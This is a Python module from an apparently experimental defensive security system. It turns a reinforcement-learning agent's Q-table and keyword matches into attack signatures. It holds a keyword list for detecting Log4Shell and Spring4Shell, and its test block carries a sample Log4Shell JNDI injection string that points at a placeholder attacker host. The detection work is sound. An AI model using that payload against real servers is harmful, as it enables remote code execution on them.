# -*- coding: utf-8 -*-
#
# Phase 23: Attack Pattern Analyzer (Immune Surveillance Component 1)
# Analyzes an attack event and the RL Agent's Q-Table to extract a formal AttackSignature.
# This signature is used by the Cluster Scanner to proactively harden other containers.

import random
import numpy as np
from typing import Dict, Tuple, List, Optional, Any
from adaptive_security.evolutionary_agent import EvolutionaryAgent, ACTION_SUPPRESS
from hierarchical_control.hierarchical_policy_engine import HierarchicalPolicyEngine

# Mock CVE Database (for simulating static analysis correlation)
MOCK_CVE_DB: Dict[str, Dict] = {
    "CVE-2021-44228": {
        "name": "Log4Shell",
        "keywords": ["${jndi:", "ldap://", "rmi://"],
        "common_paths": ["user_agent", "payload.content"],
        "severity": 10.0
    },
    "CVE-2022-22965": {
        "name": "Spring4Shell",
        "keywords": ["class.module", "classLoader"],
        "common_paths": ["payload.data"],
        "severity": 9.8
    }
}

class AttackPatternAnalyzer:
    """
    Analyzes RL Agent's learned knowledge (Q-Table) and attack features 
    to create a formal AttackSignature.
    """
    def __init__(self, critical_q_threshold: float = 100.0):
        # Q-Value가 이 임계값 이상이면 '핵심 위협 패턴'으로 간주
        self.critical_q_threshold = critical_q_threshold
        self.pattern_db: List[Dict[str, Any]] = []

    def _match_static_indicators(self, payload_text: str) -> List[str]:
        """
        Simulates static analysis of the payload to find known keywords.
        """
        found_indicators = []
        # Simple simulation: Check for keywords associated with known CVEs
        for cve, data in MOCK_CVE_DB.items():
            for keyword in data["keywords"]:
                if keyword in payload_text:
                    found_indicators.append(f"{cve}:{keyword}")
        return found_indicators

    def analyze_attack_event(self, event_data: Dict[str, Any], rl_agent: EvolutionaryAgent) -> Optional[Dict]:
        """
        공격 이벤트와 RL Agent의 Q-Table을 결합하여 AttackSignature를 추출합니다.
        """
        path = event_data['path']
        # RL Agent의 State 구성 요소를 가져옴
        # Adapter to match EvolutionaryAgent.get_state signature
        features = {
            'anomaly_score': event_data['features']['anomaly'],
            'entropy': event_data['features']['entropy'],
            'frequency': event_data['features']['frequency']
        }
        state = rl_agent.get_state(path, features)
        
        # Access Q-Table directly as get_q_values doesn't exist
        if state in rl_agent.q_table:
            q_values = rl_agent.q_table[state]
        else:
            q_values = [0.0, 0.0]
            
        suppress_q = q_values[ACTION_SUPPRESS]

        # 1. Critical Q-Value Check
        if suppress_q < self.critical_q_threshold:
            # RL Agent가 확실하게 막아야 한다고 판단하지 않은 경우 (False Positive 가능성)
            return None

        # 2. Signature Generation
        signature = {
            "signature_id": f"RL-SIG-{random.randint(1000, 9999)}",
            "threat_level": "CRITICAL",
            "vulnerable_path": path, # RL이 억제하기로 결정한 경로
            "feature_profile": {
                "anomaly_level": "HIGH", 
                "entropy_level": "HIGH" 
            },
            "rl_suppress_q_value": float(suppress_q),
            "static_indicators": self._match_static_indicators(event_data['payload_sample']),
            "suggested_remediation": "EPIGENETIC_SUPPRESSION"
        }
        
        self.pattern_db.append(signature)
        return signature

    def extract_critical_signatures(self, rl_agent: EvolutionaryAgent) -> List[Dict[str, Any]]:
        """
        RL Agent의 전체 Q-Table을 스캔하여, 가장 확실하게 막아야 하는 패턴들을 식별합니다.
        """
        critical_patterns = []
        for state_tuple, q_values in rl_agent.q_table.items():
            suppress_q = q_values[ACTION_SUPPRESS]
            if suppress_q >= self.critical_q_threshold:
                # Mock: Q-Table State를 Signature로 변환 (실제 Path는 역참조 필요)
                critical_patterns.append({
                    "state": state_tuple,
                    "suppress_q": float(suppress_q),
                    "action_confirmed": True
                })
        return critical_patterns

# ----------------------------------------------------------------------
# Simulation Example
# ----------------------------------------------------------------------

if __name__ == "__main__":
    print("--- 🔬 Attack Pattern Analyzer Test ---")

    # Mock Setup: RL Agent가 이미 Log4Shell 공격 패턴을 학습했다고 가정
    mock_agent = EvolutionaryAgent(HierarchicalPolicyEngine())
    
    # Simulate a highly trained Q-Table (Manual injection of high Q-Value)
    # State: path='user_agent', anomaly=High(2), entropy=High(2), freq=Low(0)
    # Use public method get_state with correct features dict
    high_threat_features = {
        'anomaly_score': 0.9,
        'entropy': 0.9, # Note: quantization in get_state will map this
        'frequency': 0.2
    }
    high_threat_state = mock_agent.get_state("user_agent", high_threat_features)
    mock_agent.q_table[high_threat_state] = [ -50.0, 150.0 ] # SUPPRESS Q=150.0

    # 1. Simulate Attack Event
    attack_event_data = {
        "path": "user_agent",
        "payload_sample": "Mozilla/5.0 ${jndi:ldap://attacker.com/a}",
        "features": {
            "anomaly": 0.95,
            "entropy": 0.90,
            "frequency": 0.10
        }
    }
    
    analyzer = AttackPatternAnalyzer(critical_q_threshold=100.0)
    
    # 2. Run Analysis
    print(f"\nAnalyzing Attack on path: {attack_event_data['path']}")
    signature = analyzer.analyze_attack_event(attack_event_data, mock_agent)
    
    # 3. Output Verification
    if signature:
        print("\n✅ Signature Extracted Successfully:")
        print(f"  - Vulnerable Path (RL Decision): {signature['vulnerable_path']}")
        print(f"  - Suppress Q-Value: {signature['rl_suppress_q_value']:.2f}")
        print(f"  - Static Indicators: {signature['static_indicators']}")
    else:
        print("\n❌ Analysis Failed: Q-Value did not meet the critical threshold.")
        
    # 4. Extract Critical Patterns from overall Q-Table
    print("\n--- Utilizing Immune Memory (Extracting Critical Patterns) ---")
    critical_list = analyzer.extract_critical_signatures(mock_agent)
    print(f"Total Critical Patterns in Q-Table: {len(critical_list)}")
    if critical_list:
        print(f"  - Sample State: {critical_list[0]['state']}")